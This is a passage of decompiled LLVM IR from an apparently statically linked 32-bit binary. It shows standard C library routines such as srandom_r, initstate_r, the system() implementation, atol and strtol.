  %v3_8054d39 = load i32, i32* %v2_8054d39, align 4
  store i32 %v3_8054d39, i32* %ecx.global-to-local, align 4
  %v2_8054d3c = load i32, i32* %arg1, align 4
  store i32 %v2_8054d3c, i32* %edx.global-to-local, align 4
  %v1_8054d3e = add i32 %tmp3, 24
  %v2_8054d3e = inttoptr i32 %v1_8054d3e to i32*
  %v3_8054d3e = load i32, i32* %v2_8054d3e, align 4
  store i32 %v3_8054d3e, i32* %edi.global-to-local, align 4
  %v1_8054d41 = inttoptr i32 %v3_8054d39 to i32*
  %v2_8054d41 = load i32, i32* %v1_8054d41, align 4
  store i32 %v2_8054d41, i32* %eax.global-to-local, align 4
  %v1_8054d43 = inttoptr i32 %v2_8054d3c to i32*
  %v2_8054d43 = load i32, i32* %v1_8054d43, align 4
  %v4_8054d43 = add i32 %v2_8054d43, %v2_8054d41
  store i32 %v4_8054d43, i32* %v1_8054d43, align 4
  %v0_8054d45 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d45 = inttoptr i32 %v0_8054d45 to i32*
  %v2_8054d45 = load i32, i32* %v1_8054d45, align 4
  %v1_8054d47 = add i32 %v0_8054d45, 4
  store i32 %v1_8054d47, i32* %edx.global-to-local, align 4
  %v2_8054d4a = udiv i32 %v2_8054d45, 2
  %v1_8054d4c = load i32, i32* %edi.global-to-local, align 4
  %v7_8054d4c = icmp ult i32 %v1_8054d47, %v1_8054d4c
  %v1_8054d4e = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d4e = inttoptr i32 %v1_8054d4e to i32*
  store i32 %v2_8054d4a, i32* %v2_8054d4e, align 4
  %v0_8054d51 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054d51 = add i32 %v0_8054d51, 4
  store i32 %v1_8054d51, i32* %eax.global-to-local, align 4
  br i1 %v7_8054d4c, label %dec_label_pc_8054d5a, label %dec_label_pc_8054d56

dec_label_pc_8054d56:                             ; preds = %dec_label_pc_8054d39
  %v0_8054d56 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8054d56, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d5f

dec_label_pc_8054d5a:                             ; preds = %dec_label_pc_8054d39
  %v1_8054d5a = load i32, i32* %edi.global-to-local, align 4
  %v7_8054d5a = icmp ult i32 %v1_8054d51, %v1_8054d5a
  %v1_8054d5c = icmp eq i1 %v7_8054d5a, false
  %v3_8054d5c = load i32, i32* %esi.global-to-local, align 4
  %v4_8054d5c = select i1 %v1_8054d5c, i32 %v3_8054d5c, i32 %v1_8054d51
  store i32 %v4_8054d5c, i32* %eax.global-to-local, align 4
  %v0_8054d5f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d5f

dec_label_pc_8054d5f:                             ; preds = %dec_label_pc_8054d56, %dec_label_pc_8054d5a
  %v0_8054d5f = phi i32 [ %v0_8054d56, %dec_label_pc_8054d56 ], [ %v0_8054d5f.pre, %dec_label_pc_8054d5a ]
  %v1_8054d5f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d5f = inttoptr i32 %v1_8054d5f to i32*
  store i32 %v0_8054d5f, i32* %v2_8054d5f, align 4
  %v0_8054d61 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054d61 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d61 = add i32 %v1_8054d61, 4
  %v3_8054d61 = inttoptr i32 %v2_8054d61 to i32*
  store i32 %v0_8054d61, i32* %v3_8054d61, align 4
  br label %dec_label_pc_8054d64

dec_label_pc_8054d64:                             ; preds = %dec_label_pc_8054d22, %dec_label_pc_8054d5f
  %v2_8054d64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054d64, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8054d2d, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054d64, { 1, 0 }
  uselistorder label %dec_label_pc_8054d5f, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8054d6b = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054d6f = load i32, i32* @edi, align 4
  %v0_8054d70 = load i32, i32* @esi, align 4
  %v0_8054d71 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8054d7d = add i32 %tmp14, 12
  %v2_8054d7d = inttoptr i32 %v1_8054d7d to i32*
  %v3_8054d7d = load i32, i32* %v2_8054d7d, align 4
  store i32 %v3_8054d7d, i32* %ecx.global-to-local, align 4
  %v6_8054d83 = icmp ugt i32 %v3_8054d7d, 4
  br i1 %v6_8054d83, label %dec_label_pc_8054dfd, label %dec_label_pc_8054d85

dec_label_pc_8054d85:                             ; preds = %entry
  %v1_8054d85 = add i32 %tmp14, 8
  %v2_8054d85 = inttoptr i32 %v1_8054d85 to i32*
  %v3_8054d85 = load i32, i32* %v2_8054d85, align 4
  store i32 %v3_8054d85, i32* %ebx.global-to-local, align 4
  %v1_8054d88 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8054d8f = select i1 %v1_8054d88, i32 1, i32 %arg1
  store i32 %v3_8054d8f, i32* %edx.global-to-local, align 4
  %v1_8054d92 = icmp eq i32 %v3_8054d7d, 0
  %v2_8054d94 = inttoptr i32 %v3_8054d85 to i32*
  store i32 %v3_8054d8f, i32* %v2_8054d94, align 4
  br i1 %v1_8054d92, label %dec_label_pc_8054dfb, label %dec_label_pc_8054d98

dec_label_pc_8054d98:                             ; preds = %dec_label_pc_8054d85
  %v0_8054d98 = load i32, i32* @esi, align 4
  %v1_8054d98 = add i32 %v0_8054d98, 16
  %v2_8054d98 = inttoptr i32 %v1_8054d98 to i32*
  %v3_8054d98 = load i32, i32* %v2_8054d98, align 4
  store i32 %v3_8054d98, i32* %eax.global-to-local, align 4
  %v0_8054d9b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054d9b, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8054da2 = sext i32 %v3_8054d98 to i64
  store i64 %v4_8054da2, i64* %stack_var_-40, align 8
  %v5_8054dd832 = icmp sgt i32 %v3_8054d98, 1
  br i1 %v5_8054dd832, label %dec_label_pc_8054da7, label %dec_label_pc_8054dda

dec_label_pc_8054da7:                             ; preds = %dec_label_pc_8054d98, %dec_label_pc_8054da7.dec_label_pc_8054da7_crit_edge
  %v0_8054dcf = phi i32 [ %v0_8054dcf.pre, %dec_label_pc_8054da7.dec_label_pc_8054da7_crit_edge ], [ %v0_8054d9b, %dec_label_pc_8054d98 ]
  %v0_8054da7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054dae = ashr i32 %v0_8054da7, 31
  %v2_8054daf = zext i32 %v0_8054da7 to i64
  %v4_8054daf = zext i32 %v1_8054dae to i64
  %v5_8054daf = mul nuw i64 %v4_8054daf, 4294967296
  %v6_8054daf = or i64 %v5_8054daf, %v2_8054daf
  %v8_8054daf = sdiv i64 %v6_8054daf, 127773
  %v9_8054daf = trunc i64 %v8_8054daf to i32
  %v10_8054daf = srem i64 %v6_8054daf, 127773
  %v3_8054db5 = mul nsw i64 %v10_8054daf, 16807
  %v4_8054db5 = trunc i64 %v3_8054db5 to i32
  %tmp24 = mul i32 %v9_8054daf, -2836
  %v2_8054dc1 = add i32 %v4_8054db5, %tmp24
  %v1_8054dc3 = add i32 %v2_8054dc1, 1
  %v6_8054dc3 = xor i32 %v2_8054dc1, -2147483648
  %v7_8054dc3 = xor i32 %v1_8054dc3, %v2_8054dc1
  %v8_8054dc3 = and i32 %v7_8054dc3, %v6_8054dc3
  %v9_8054dc3 = icmp slt i32 %v8_8054dc3, 0
  %v10_8054dc3 = icmp eq i32 %v1_8054dc3, 0
  %v11_8054dc3 = icmp slt i32 %v1_8054dc3, 0
  %v1_8054dc6 = add i32 %v2_8054dc1, 2147483647
  store i32 %v1_8054dc6, i32* %eax.global-to-local, align 4
  %v3_8054dcc = icmp ne i1 %v11_8054dc3, %v9_8054dc3
  %v4_8054dcc = or i1 %v10_8054dc3, %v3_8054dcc
  %v7_8054dcc = select i1 %v4_8054dcc, i32 %v1_8054dc6, i32 %v2_8054dc1
  store i32 %v7_8054dcc, i32* %edx.global-to-local, align 4
  %v1_8054dcf = add i32 %v0_8054dcf, 4
  store i32 %v1_8054dcf, i32* %ecx.global-to-local, align 4
  %v2_8054dd2 = inttoptr i32 %v1_8054dcf to i32*
  store i32 %v7_8054dcc, i32* %v2_8054dd2, align 4
  %v0_8054dd4 = load i32, i32* @edi, align 4
  %v1_8054dd4 = add i32 %v0_8054dd4, 1
  store i32 %v1_8054dd4, i32* @edi, align 4
  %v3_8054dd5.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8054dd5.pre to i32
  %v5_8054dd8 = icmp slt i32 %v1_8054dd4, %extract.t11
  br i1 %v5_8054dd8, label %dec_label_pc_8054da7.dec_label_pc_8054da7_crit_edge, label %dec_label_pc_8054dd5.dec_label_pc_8054dda_crit_edge

dec_label_pc_8054da7.dec_label_pc_8054da7_crit_edge: ; preds = %dec_label_pc_8054da7
  %v0_8054dcf.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054da7

dec_label_pc_8054dd5.dec_label_pc_8054dda_crit_edge: ; preds = %dec_label_pc_8054da7
  %v0_8054dda.pre = load i32, i32* @esi, align 4
  %v0_8054ddd.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054dda

dec_label_pc_8054dda:                             ; preds = %dec_label_pc_8054dd5.dec_label_pc_8054dda_crit_edge, %dec_label_pc_8054d98
  %v0_8054ddd = phi i32 [ %v0_8054ddd.pre, %dec_label_pc_8054dd5.dec_label_pc_8054dda_crit_edge ], [ %v0_8054d9b, %dec_label_pc_8054d98 ]
  %v0_8054dda = phi i32 [ %v0_8054dda.pre, %dec_label_pc_8054dd5.dec_label_pc_8054dda_crit_edge ], [ %v0_8054d98, %dec_label_pc_8054d98 ]
  %v1_8054dda = add i32 %v0_8054dda, 20
  %v2_8054dda = inttoptr i32 %v1_8054dda to i32*
  %v3_8054dda = load i32, i32* %v2_8054dda, align 4
  store i32 %v3_8054dda, i32* %eax.global-to-local, align 4
  %v2_8054ddd = add i32 %v0_8054dda, 4
  %v3_8054ddd = inttoptr i32 %v2_8054ddd to i32*
  store i32 %v0_8054ddd, i32* %v3_8054ddd, align 4
  %v0_8054de0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054de0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054de0 = mul i32 %v1_8054de0, 4
  %v3_8054de0 = add i32 %v2_8054de0, %v0_8054de0
  store i32 %v3_8054de0, i32* %eax.global-to-local, align 4
  %v1_8054de3 = load i32, i32* @esi, align 4
  %v2_8054de3 = inttoptr i32 %v1_8054de3 to i32*
  store i32 %v3_8054de0, i32* %v2_8054de3, align 4
  %v3_8054de5 = load i64, i64* %stack_var_-40, align 8
  %v6_8054de5 = mul nsw i64 %v3_8054de5, 10
  %v7_8054de5 = trunc i64 %v6_8054de5 to i32
  %v2_8054deb = ptrtoint i32* %stack_var_-20 to i32
  %v1_8054df825 = add i32 %v7_8054de5, -1
  %v9_8054df829 = icmp slt i32 %v1_8054df825, 0
  store i32 %v1_8054df825, i32* @ebx, align 4
  %v1_8054df930 = icmp eq i1 %v9_8054df829, false
  br i1 %v1_8054df930, label %dec_label_pc_8054deb, label %dec_label_pc_8054dfb

dec_label_pc_8054deb:                             ; preds = %dec_label_pc_8054dda, %dec_label_pc_8054deb
  store i32 %v2_8054deb, i32* %eax.global-to-local, align 4
  %v0_8054df0 = load i32, i32* @esi, align 4
  %v2_8054df1 = inttoptr i32 %v0_8054df0 to i32*
  %v3_8054df1 = call i32 @__GI_random_r(i32* %v2_8054df1, i32 %v2_8054deb)
  store i32 %v0_8054df0, i32* %eax.global-to-local, align 4
  store i32 %v2_8054deb, i32* %edx.global-to-local, align 4
  %v0_8054df8.pre = load i32, i32* @ebx, align 4
  %v1_8054df8 = add i32 %v0_8054df8.pre, -1
  %v9_8054df8 = icmp slt i32 %v1_8054df8, 0
  store i32 %v1_8054df8, i32* @ebx, align 4
  %v1_8054df9 = icmp eq i1 %v9_8054df8, false
  br i1 %v1_8054df9, label %dec_label_pc_8054deb, label %dec_label_pc_8054dfb

dec_label_pc_8054dfb:                             ; preds = %dec_label_pc_8054dda, %dec_label_pc_8054deb, %dec_label_pc_8054d85
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054dfd

dec_label_pc_8054dfd:                             ; preds = %entry, %dec_label_pc_8054dfb
  %v0_8054e04 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8054dfb ]
  store i32 %v0_8054d71, i32* @ebx, align 4
  store i32 %v0_8054d70, i32* @esi, align 4
  store i32 %v0_8054d6f, i32* @edi, align 4
  store i32 %v0_8054d6b, i32* @ebp, align 4
  ret i32 %v0_8054e04

; uselistorder directives
  uselistorder i32 %v1_8054df8, { 1, 0 }
  uselistorder i32 %v0_8054dda, { 1, 0 }
  uselistorder i32 %v1_8054dc3, { 2, 1, 0 }
  uselistorder i32 %v2_8054dc1, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8054d9b, { 1, 0, 2 }
  uselistorder i32 %v3_8054d7d, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8054dfd, { 1, 0 }
  uselistorder label %dec_label_pc_8054dfb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054deb, { 1, 0 }
  uselistorder label %dec_label_pc_8054da7, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8054e07 = load i32, i32* @esi, align 4
  %v0_8054e08 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8054e29, label %dec_label_pc_8054e1d

dec_label_pc_8054e1d:                             ; preds = %entry
  %v2_8054e1d = icmp ult i32 %arg3, 256
  %v1_8054e24 = select i1 %v2_8054e1d, i32 5, i32 4
  store i32 %v1_8054e24, i32* @ebx, align 4
  br label %dec_label_pc_8054e3f

dec_label_pc_8054e29:                             ; preds = %entry
  %v6_8054e2c = icmp ugt i32 %arg3, 31
  br i1 %v6_8054e2c, label %dec_label_pc_8054e37, label %dec_label_pc_8054e2e

dec_label_pc_8054e2e:                             ; preds = %dec_label_pc_8054e29
  store i32 0, i32* @ebx, align 4
  %v6_8054e33 = icmp ugt i32 %arg3, 7
  br i1 %v6_8054e33, label %dec_label_pc_8054e3f, label %dec_label_pc_8054e8f

dec_label_pc_8054e37:                             ; preds = %dec_label_pc_8054e29
  %v2_8054e37 = icmp ult i32 %arg3, 64
  %v1_8054e3c = select i1 %v2_8054e37, i32 3, i32 2
  store i32 %v1_8054e3c, i32* @ebx, align 4
  br label %dec_label_pc_8054e3f

dec_label_pc_8054e3f:                             ; preds = %dec_label_pc_8054e2e, %dec_label_pc_8054e1d, %dec_label_pc_8054e37
  %v0_8054e49 = phi i32 [ 0, %dec_label_pc_8054e2e ], [ %v1_8054e24, %dec_label_pc_8054e1d ], [ %v1_8054e3c, %dec_label_pc_8054e37 ]
  %v1_8054e3f = mul nuw nsw i32 %v0_8054e49, 4
  %v2_8054e3f = add i32 %v1_8054e3f, ptrtoint (i32* @global_var_805e7f4.985 to i32)
  %v3_8054e3f = inttoptr i32 %v2_8054e3f to i32*
  %v4_8054e3f = load i32, i32* %v3_8054e3f, align 4
  store i32 %v4_8054e3f, i32* %eax.global-to-local, align 4
  %v1_8054e46 = add i32 %tmp7, 4
  store i32 %v1_8054e46, i32* @esi, align 4
  %v2_8054e49 = add i32 %v1_8054e3f, ptrtoint (i32* @global_var_805e7e0.986 to i32)
  %v3_8054e49 = inttoptr i32 %v2_8054e49 to i32*
  %v4_8054e49 = load i32, i32* %v3_8054e49, align 4
  store i32 %v4_8054e49, i32* %edx.global-to-local, align 4
  %v2_8054e50 = add i32 %arg4, 12
  %v3_8054e50 = inttoptr i32 %v2_8054e50 to i32*
  store i32 %v0_8054e49, i32* %v3_8054e50, align 4
  %v0_8054e53 = load i32, i32* @esi, align 4
  %v1_8054e53 = load i32, i32* @edi, align 4
  %v2_8054e53 = add i32 %v1_8054e53, 8
  %v3_8054e53 = inttoptr i32 %v2_8054e53 to i32*
  store i32 %v0_8054e53, i32* %v3_8054e53, align 4
  %v0_8054e56 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e56 = load i32, i32* @edi, align 4
  %v2_8054e56 = add i32 %v1_8054e56, 16
  %v3_8054e56 = inttoptr i32 %v2_8054e56 to i32*
  store i32 %v0_8054e56, i32* %v3_8054e56, align 4
  %v0_8054e59 = load i32, i32* @esi, align 4
  %v1_8054e59 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054e59 = mul i32 %v1_8054e59, 4
  %v3_8054e59 = add i32 %v2_8054e59, %v0_8054e59
  store i32 %v3_8054e59, i32* %eax.global-to-local, align 4
  %v0_8054e5c = load i32, i32* %edx.global-to-local, align 4
  %v1_8054e5c = load i32, i32* @edi, align 4
  %v2_8054e5c = add i32 %v1_8054e5c, 20
  %v3_8054e5c = inttoptr i32 %v2_8054e5c to i32*
  store i32 %v0_8054e5c, i32* %v3_8054e5c, align 4
  %v0_8054e5f = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e5f = load i32, i32* @edi, align 4
  %v2_8054e5f = add i32 %v1_8054e5f, 24
  %v3_8054e5f = inttoptr i32 %v2_8054e5f to i32*
  store i32 %v0_8054e5f, i32* %v3_8054e5f, align 4
  %v0_8054e62 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8054e67 = inttoptr i32 %v0_8054e62 to i32*
  %v3_8054e67 = call i32 @srandom_r(i32 %arg1, i32* %v2_8054e67)
  %v0_8054e6c = load i32, i32* @ebp, align 4
  %v1_8054e6c = inttoptr i32 %v0_8054e6c to i32*
  store i32 0, i32* %v1_8054e6c, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054e77 = load i32, i32* @ebx, align 4
  %v1_8054e77 = icmp eq i32 %v0_8054e77, 0
  br i1 %v1_8054e77, label %dec_label_pc_8054ea8, label %dec_label_pc_8054e7b

dec_label_pc_8054e7b:                             ; preds = %dec_label_pc_8054e3f
  %v0_8054e7b = load i32, i32* @edi, align 4
  %v1_8054e7b = add i32 %v0_8054e7b, 4
  %v2_8054e7b = inttoptr i32 %v1_8054e7b to i32*
  %v3_8054e7b = load i32, i32* %v2_8054e7b, align 4
  %v1_8054e7e = load i32, i32* @esi, align 4
  %v2_8054e7e = sub i32 %v3_8054e7b, %v1_8054e7e
  %v2_8054e80 = sdiv i32 %v2_8054e7e, 4
  %v3_8054e83 = mul i32 %v2_8054e80, 5
  %v2_8054e86 = add i32 %v3_8054e83, %v0_8054e77
  %v1_8054e88 = load i32, i32* @ebp, align 4
  %v2_8054e88 = inttoptr i32 %v1_8054e88 to i32*
  store i32 %v2_8054e86, i32* %v2_8054e88, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ea8

dec_label_pc_8054e8f:                             ; preds = %dec_label_pc_8054e2e
  %v1_8054e8f = call i32 @__errno_location(i32 %v0_8054e08)
  store i32 %v1_8054e8f, i32* %eax.global-to-local, align 4
  %v1_8054e94 = inttoptr i32 %v1_8054e8f to i32*
  store i32 22, i32* %v1_8054e94, align 4
  %v0_8054e9a = load i32, i32* %stack_var_-36, align 4
  %v1_8054e9a = call i32 @__errno_location(i32 %v0_8054e9a)
  %v1_8054e9f = inttoptr i32 %v1_8054e9a to i32*
  store i32 22, i32* %v1_8054e9f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ea8

dec_label_pc_8054ea8:                             ; preds = %dec_label_pc_8054e3f, %dec_label_pc_8054e7b, %dec_label_pc_8054e8f
  %v0_8054eaf = phi i32 [ 0, %dec_label_pc_8054e3f ], [ 0, %dec_label_pc_8054e7b ], [ -1, %dec_label_pc_8054e8f ]
  store i32 %v0_8054e07, i32* @esi, align 4
  ret i32 %v0_8054eaf

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054ea8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054e3f, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8054eb0 = load i32, i32* @ebx, align 4
  %v4_8054eb9 = icmp eq i32 %arg1, 0
  br i1 %v4_8054eb9, label %dec_label_pc_8054fdc, label %dec_label_pc_8054ec4

dec_label_pc_8054ec4:                             ; preds = %entry
  %v2_8054eca = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054ed9 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8054ee8 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054ef1 = call i32 @__vfork(i32 %v2_8054ee8)
  %v2_8054ef9 = icmp slt i32 %v1_8054ef1, 0
  store i32 %v1_8054ef1, i32* @ebx, align 4
  %v2_8054efe = icmp eq i1 %v2_8054ef9, false
  br i1 %v2_8054efe, label %dec_label_pc_8054f2f, label %dec_label_pc_8054f00

dec_label_pc_8054f00:                             ; preds = %dec_label_pc_8054ec4
  %v2_8054f08 = call i32 @__bsd_signal(i32 3, i32 %v2_8054eca)
  store i32 %v2_8054eca, i32* @edx, align 4
  %v2_8054f15 = call i32 @__bsd_signal(i32 2, i32 %v2_8054ed9)
  store i32 2, i32* @ebx, align 4
  %v2_8054f22 = call i32 @__bsd_signal(i32 17, i32 %v2_8054ee8)
  br label %dec_label_pc_8054fd9

dec_label_pc_8054f2f:                             ; preds = %dec_label_pc_8054ec4
  %v1_8054ef9 = icmp eq i32 %v1_8054ef1, 0
  %v1_8054f2f = icmp eq i1 %v1_8054ef9, false
  br i1 %v1_8054f2f, label %dec_label_pc_8054f7b, label %dec_label_pc_8054f31

dec_label_pc_8054f31:                             ; preds = %dec_label_pc_8054f2f
  %v2_8054f37 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8054f42 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8054f4d = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8054f6c = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805e80b.989 to i32), i32 ptrtoint ([3 x i8]* @global_var_805e810.988 to i32), i32 ptrtoint ([3 x i8]* @global_var_805e808.987 to i32), i32 %arg1, i32 0)
  %v1_8054f76 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8054f7b:                             ; preds = %dec_label_pc_8054f2f
  %v2_8054f81 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054f8c = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8054f91 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8054f9a = load i32, i32* @ebx, align 4
  %v7_8054f9b = call i32 @wait4(i32 %v0_8054f9a, i32 %v2_8054f91, i32 0, i32 0)
  %v8_8054fa6 = icmp eq i32 %v7_8054f9b, -1
  %v1_8054fa7 = icmp eq i1 %v8_8054fa6, false
  %v6_8054fa7 = load i32, i32* %stack_var_-8, align 4
  %v7_8054fa7 = select i1 %v1_8054fa7, i32 %v6_8054fa7, i32 -1
  store i32 %v7_8054fa7, i32* @edx, align 4
  store i32 %v7_8054fa7, i32* %stack_var_-8, align 4
  %v2_8054fb6 = call i32 @__bsd_signal(i32 3, i32 %v2_8054eca)
  store i32 %v2_8054eca, i32* @ebx, align 4
  %v2_8054fc3 = call i32 @__bsd_signal(i32 2, i32 %v2_8054ed9)
  store i32 %v2_8054ed9, i32* @edx, align 4
  %v2_8054fd0 = call i32 @__bsd_signal(i32 17, i32 %v2_8054ee8)
  %v3_8054fd5 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054fd9

dec_label_pc_8054fd9:                             ; preds = %dec_label_pc_8054f00, %dec_label_pc_8054f7b
  %storemerge = phi i32 [ -1, %dec_label_pc_8054f00 ], [ %v3_8054fd5, %dec_label_pc_8054f7b ]
  br label %dec_label_pc_8054fdc

dec_label_pc_8054fdc:                             ; preds = %entry, %dec_label_pc_8054fd9
  %v0_8054fe0 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8054fd9 ]
  store i32 %v0_8054eb0, i32* @ebx, align 4
  ret i32 %v0_8054fe0

; uselistorder directives
  uselistorder i32 %v1_8054ef1, { 2, 0, 1 }
  uselistorder i32 %v2_8054ee8, { 1, 0, 2 }
  uselistorder i32 %v2_8054ed9, { 0, 2, 1 }
  uselistorder i32 %v2_8054eca, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_8054fdc, { 1, 0 }
  uselistorder label %dec_label_pc_8054fd9, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8054fef = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8054fef
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8055009 = inttoptr i32 %arg1 to i8*
  %v5_8055009 = call i32 @_stdlib_strto_l(i8* %v4_8055009, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8055009
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055017 = load i32, i32* @ebx, align 4
  store i32 %v0_8055017, i32* %stack_var_-16, align 4
  %v4_805501b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805501b, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8055023 = load i32, i32* @global_var_805f23c, align 4
  store i32 %v0_8055023, i32* %edx.global-to-local, align 4
  store i32 %v4_805501b, i32* %ebx.global-to-local, align 4
  %v2_805502e41 = load i8, i8* %arg1, align 1
  %v3_805502e42 = sext i8 %v2_805502e41 to i32
  store i32 %v3_805502e42, i32* %eax.global-to-local, align 4
  %v2_805503143 = mul nsw i32 %v3_805502e42, 2
  %v3_805503144 = add i32 %v2_805503143, %v0_8055023
  %v4_805503145 = inttoptr i32 %v3_805503144 to i8*
  %v5_805503146 = load i8, i8* %v4_805503145, align 1
  %v6_805503147 = and i8 %v5_805503146, 32
  %v7_805503148 = icmp eq i8 %v6_805503147, 0
  %v1_805503549 = icmp eq i1 %v7_805503148, false
  br i1 %v1_805503549, label %dec_label_pc_805502d, label %dec_label_pc_8055037

dec_label_pc_805502d:                             ; preds = %entry, %dec_label_pc_805502d
  %v0_805502d50 = phi i32 [ %v1_805502d, %dec_label_pc_805502d ], [ %v4_805501b, %entry ]
  %v1_805502d = add i32 %v0_805502d50, 1
  store i32 %v1_805502d, i32* %ebx.global-to-local, align 4
  %v1_805502e = inttoptr i32 %v1_805502d to i8*
  %v2_805502e = load i8, i8* %v1_805502e, align 1
  %v3_805502e = sext i8 %v2_805502e to i32
  store i32 %v3_805502e, i32* %eax.global-to-local, align 4
  %v2_8055031 = mul nsw i32 %v3_805502e, 2
  %v3_8055031 = add i32 %v2_8055031, %v0_8055023
  %v4_8055031 = inttoptr i32 %v3_8055031 to i8*
  %v5_8055031 = load i8, i8* %v4_8055031, align 1
  %v6_8055031 = and i8 %v5_8055031, 32
  %v7_8055031 = icmp eq i8 %v6_8055031, 0
  %v1_8055035 = icmp eq i1 %v7_8055031, false
  br i1 %v1_8055035, label %dec_label_pc_805502d, label %dec_label_pc_8055037

